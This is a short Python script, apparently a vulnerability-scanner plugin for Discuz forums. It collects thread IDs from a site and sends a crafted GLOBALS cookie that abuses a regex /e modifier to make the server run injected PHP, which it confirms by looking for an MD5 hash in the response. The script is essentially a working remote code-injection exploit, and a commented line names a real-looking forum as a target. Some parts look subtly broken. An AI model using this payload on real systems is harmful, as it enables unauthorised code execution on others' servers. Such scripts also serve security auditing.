#!/usr/bin/env python
# -*- coding: utf-8 -*-
import re
import requests

def assign(service, arg):
    if service == "discuz":
        return True, arg

def gettid(args):
    try:
        req = requests.get(args, timeout=5)
        if req.status_code==200:
            tids = re.findall(r'viewthread.php\?tid=(\d+)',req.content)
            if tids:
                return tids
            tids = re.findall(r'thread-(\d+)-',req.content)
            if tids:
                return tids
    except requests.Timeout:
        return None

def audit(args):
    tids = gettid(args)
    if tids:
        cookie = 'GLOBALS%5b_DCACHE%5d%5bsmilies%5d%5bsearcharray%5d=/.*/eui;GLOBALS%5b_DCACHE%5d%5bsmilies%5d%5breplacearray%5d=print_r(md5(521521))'
        for tid in tids:
            #帖子中必须有表情images/smilies,才会触发漏洞
            payload = 'viewthread.php?tid='+tid
            verify_url = args + payload

            try:
                req = requests.get(verify_url, cookies=cookie)
                if req.status_code==200:
                    if '35fd19fbe470f0cb5581884fa700610f' in req.content:
                        security_hole(verify_url)
                        break
            except requests.Timeout:
                pass

# if __name__ == '__main__':
#     from dummy import *
#     audit(assign('discuz', 'http://bbs.cloopen.com/')[1])

from hackhttp import hackhttp
from func import *